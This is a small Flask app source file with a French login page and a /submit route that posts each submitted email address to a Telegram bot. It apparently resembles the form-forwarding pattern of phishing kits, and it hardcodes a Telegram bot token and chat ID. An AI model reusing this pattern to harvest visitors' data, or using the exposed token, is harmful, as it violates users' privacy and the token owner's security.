from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

TOKEN = "bot8928542394:AAEZ9977AxW_GtsaooL5jiSoSTFS-i1o5DU"
CHAT_ID = "6823880612"

@app.route('/', methods=['GET', 'POST'])
def home():

    print("METHOD:", request.method)
    print("DATA:", request.form)

    error = None

    if request.method == 'POST':

        email = request.form.get('email')
        password = request.form.get('password')

        if not email or not password:
            print("POST VIDE")
            return render_template("login.html", error=None)

        if email == "test@gmail.com" and password == "1234":
            return "Dashboard OK"
        else:
            error = "Mot de passe incorrect"

    return render_template("login.html", error=error)


@app.route('/forgot-password')   # 👈 AJOUT ICI
def forgot_password():
    return "Page mot de passe oublié"


@app.route('/submit', methods=['POST'])
def submit():

    email = request.form.get('email')
    print("EMAIL REÇU:", email)

    if not email:
        return jsonify({"success": False, "error": "no email"})

    message = f"""
📩 Nouveau formulaire

Email : {email}
"""

    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

    data = {
        "chat_id": CHAT_ID,
        "text": message
    }

    response = requests.post(url, data=data)
    print("TELEGRAM RESPONSE:", response.text)

    return jsonify({"success": True})


if __name__ == '__main__':
    app.run(debug=True)